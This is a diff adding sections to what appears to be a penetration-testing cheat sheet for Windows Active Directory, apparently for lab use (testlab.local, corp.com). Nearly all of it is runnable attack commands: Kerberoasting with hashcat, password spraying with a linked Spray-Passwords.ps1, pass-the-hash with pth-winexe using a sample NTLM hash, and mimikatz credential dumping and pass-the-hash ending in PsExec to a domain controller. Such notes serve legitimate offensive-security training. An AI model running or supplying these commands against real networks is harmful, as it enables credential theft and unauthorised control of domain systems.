@@ -114,8 +114,24 @@ hashcat64.exe -m 13100 hash.txt pass.txt --force
 Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)' -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
 ```
 ###### Low and Slow Password Guessing
+https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Spray-Passwords.ps1
 ```
 net accounts
 .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins -Verbose
 .\Spray-Passwords.ps1 -File .\passwords.txt -Admins -Verbose
+```
+
+### Lateral Movement
+###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
+```
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
+https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+```
+sekurlsa::logonpasswords
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+net use \\dc01(logon server)
+klist
+.\PsExec.exe \\dc01 cmd.exe
 ```
